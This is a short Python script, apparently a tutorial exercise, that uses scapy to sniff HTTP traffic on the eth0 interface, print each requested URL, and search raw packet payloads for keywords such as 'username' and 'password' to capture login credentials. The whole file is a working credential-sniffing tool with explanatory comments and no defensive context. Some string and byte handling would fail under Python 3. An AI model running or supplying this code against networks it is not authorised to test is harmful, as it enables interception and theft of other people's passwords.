#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    #function called sniff, takes a variable named interface which references the interface we want to sniff data from.
    #we are telling scapy sniff the interface will be the variable we set, that we don't want to store anything in
    #memory, and is calling the process_sniffed_packet function for every piece of data sniffed
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    #if the packet has  raw layer (frequently contains login info), search for the keywords provided in our dictionary
    #and if any show up, return the result in the load variable
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    #if our packet has an http layer, and that packet has a Raw layer (the layer we found has username and passwords,
    #print that packet
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")